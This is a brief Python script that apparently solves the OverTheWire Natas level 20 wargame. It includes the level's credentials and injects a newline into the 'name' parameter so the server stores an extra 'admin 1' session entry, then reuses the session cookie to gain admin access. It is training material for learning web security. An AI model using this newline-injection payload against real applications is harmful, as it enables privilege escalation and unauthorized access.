import requests

target = 'http://natas20.natas.labs.overthewire.org'
auth = ('natas20', 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH')

print "@"
print "# FIRST REQUEST"
print "#"
params = dict(name='admin\nadmin 1', debug='') # <-- this is the key part
#             ^^^^^^^^^^^^^^^^^^^^^
cookies = dict()
r = requests.get(target, auth=auth, params=params, cookies=cookies)
phpsessid = r.cookies['PHPSESSID']
print r.text

print "\n\n"
print "#"
print "# SECOND REQUEST"
print "#"
params = dict(debug='')
cookies = dict(PHPSESSID=phpsessid)
r = requests.get(target, auth=auth, params=params, cookies=cookies)
print r.text